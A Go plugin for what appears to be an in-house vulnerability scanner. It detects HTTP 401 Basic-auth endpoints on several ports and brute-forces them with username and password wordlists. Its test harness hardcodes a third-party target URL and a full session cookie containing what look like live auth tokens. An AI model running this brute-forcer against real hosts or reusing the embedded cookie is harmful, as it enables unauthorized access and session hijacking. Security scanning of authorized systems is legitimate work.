package main

import (
	"fmt"
	"net/url"
	"strings"
	"time"

	"zeroScannerGo/engine"
	"zeroScannerGo/engine/lib/util"
	"zeroScannerGo/engine/lib/zhttp"

	"net"
)

var (
	//	InitCookie   = engine.InitCookie //需要使用engine.GetCookie方法则设置这一条，引擎会在外部调用InitCookie方法
	InitDnsCache         = zhttp.SetDnsCache //为zhttp设置dns缓存，引擎会在外部调用InitDnsCache方法
	ports                = []string{"8080", "8081", "9090"}
	usernames, passwords []string
)

func init() {
	var err error
	usernames, err = util.ReadLines("401_user.txt")
	if err != nil {
		panic(err)
	}
	passwords, err = util.ReadLines("401_pass.txt")
	if err != nil {
		panic(err)
	}
}

func Verify(params engine.Params) engine.Result {
	var result = engine.Result{}
	//	proxy, _ := url.Parse("http://127.0.0.1:8080")
	newPorts := util.GetPorts(ports, params.ParsedTarget.Port(), params.ParsedTarget.Path)
	for _, port := range newPorts {
		params.ParsedTarget.Host = strings.TrimSuffix(net.JoinHostPort(params.ParsedTarget.Hostname(), port), ":")
		resp, err := zhttp.Get(params.ParsedTarget.String(), &zhttp.RequestOptions{
			DialTimeout:        time.Second * 5,
			RequestTimeout:     time.Second * 5,
			DisableRedirect:    true,
			InsecureSkipVerify: true,
			Hosts:              params.Hosts,
			//			Proxies: map[string]*url.URL{
			//				"http":  proxy,
			//				"https": proxy,
			//			},
		})
		if err != nil {
			continue
		} else {
			resp.Close()
			headers := strings.ToLower(resp.RawHeaders())
			if resp.StatusCode() == 401 && strings.Contains(headers, "www-authenticate") || strings.Contains(headers, "authorization required") {
				result.Vul = true
				result.VulUrl = params.ParsedTarget.String()
				result.VulInfo = "401认证对外"
				result.Level = engine.VulMiddleLevel
				for _, username := range usernames {
					for _, password := range passwords {
						resp, err = zhttp.Get(params.ParsedTarget.String(), &zhttp.RequestOptions{
							DialTimeout:    time.Second * 5,
							RequestTimeout: time.Second * 5,
							Host:           params.Hosts,
							Auth:           []string{username, password},
							//							Proxies: map[string]*url.URL{
							//								"http":  proxy,
							//								"https": proxy,
							//							},
						})
						if err != nil {
							continue
						} else {
							resp.Close()
							if resp.StatusCode() == 200 {
								result.Extend = username + "----" + password
								result.VulInfo = "401认证弱口令"
								result.VulUrl = params.ParsedTarget.String()
								return result
							}
						}
					}
				}
				return result
			} else {
				continue
			}
		}
	}
	//	if !result.Vul {
	//		result.Stop = 24
	//	}
	return result
}

func main() {
	params := engine.Params{}
	params.Method = "GET"
	params.Target = "http://testapimojing.7fresh.com/errorlog"
	parsedTarget, _ := url.Parse(params.Target)
	params.ParsedTarget = *parsedTarget
	params.ContentType = "application/json"
	params.Cookie = "pin=waimianyougesongshu;pt_pin=waimianyougesongshu;thor=4958F70A5CFDC4BD2E428A7F776B05616B560C1D5FB7782A6427BCF272A3061BE99E7534D75187ECC0F6A3E9A830EEABE553E9989653E3BCF775484C7C476A07FC583A903D50DB0CEEF0E4ADE7C86597321F898D8CD6408A823018D4838564827D40EB17426BB909CBECB93C747E39EEE292BE9956D082E6B6C8FE4333D672FDB197EC1BCAACB75280F3CDCA3E64252E406DD35E81ECF143E85F078346FF4763;pt_key=AAFbFe9GADAFJ31_-q0Du1qie6VpTd90rZDYAnd8cF6ZLF1o1ri81pMN82tLKYU3gCIVMXW4Gs8;sid=a709566c388c0f46ce25e10867bfc7a0;"

	result := Verify(params)
	fmt.Printf("%+v\r\n", result)
}
